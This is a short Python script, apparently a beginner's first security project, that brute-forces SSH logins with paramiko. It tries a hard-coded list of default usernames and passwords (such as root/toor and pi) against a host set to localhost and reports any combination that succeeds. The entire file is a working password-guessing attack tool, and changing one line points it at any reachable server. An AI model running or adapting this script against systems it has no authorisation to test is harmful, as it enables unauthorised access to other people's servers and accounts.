#!/usr/bin/env python3
# Project #1 - SSH login brute forcing

import paramiko

# Ideally this would come from a file or a database, but it's fine for testing
passwords = ["admin", "root", "toor", "pi"]
usernames = ["admin", "root"]
host = "localhost"

def try_authentication():
    paramiko.util.log_to_file("logfile")
    ssh_connection = paramiko.SSHClient()
    # Automatically accept / add unknown host keys
    ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for username in usernames:
        for password in passwords:
            print(f"[*] Trying {username}@{host} with '{password}' ..")
            try:
                ssh_connection.connect(host, username=username, password=password)
                print(f"[+] Connection to {host} succesful with {username}:{password}!")
                # Once we have found a working password there's not really a
                # point to keep trying
                break
            except Exception as e:
                # That is noisy, only do that when debugging is enabled
                # print(f"[!] Something went wrong:\n\n\n{e}")
                pass

try_authentication()
